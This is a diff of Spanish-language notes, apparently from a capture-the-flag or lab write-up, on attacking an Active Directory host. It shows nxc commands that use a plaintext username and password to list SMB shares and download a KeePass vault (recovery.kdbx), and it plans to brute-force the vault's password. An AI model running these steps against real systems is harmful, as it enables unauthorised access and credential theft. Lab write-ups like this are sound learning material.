@@ -69,8 +69,14 @@ Añadimos usuario a grupo DEVELOPERS por que tenemos generic write
 Como nos hemos vovemos a acceder al smb y vemos que tenmos acceso a DEV
 `nxc smb $IP -u 'levi.james' -p 'KingofAkron2025!' --shares `
 
+Nos encontramos que en el directorio hay un archivo con extensión de keepass `kdbx` 
+`recovery.kdbx`
 
+Nos descargamos el archivo 
+`nxc smb $IP -u 'levi.james' -p 'KingofAkron2025!' --share 'DEV' --get-file 'recovery.kdbx' 'recovery.kdbx'`
 
+Lo añadimos a Keepassxc el archivo y nos pide una passwd
+como no la tenemos la hacemos fuerza bruta
 
 
 
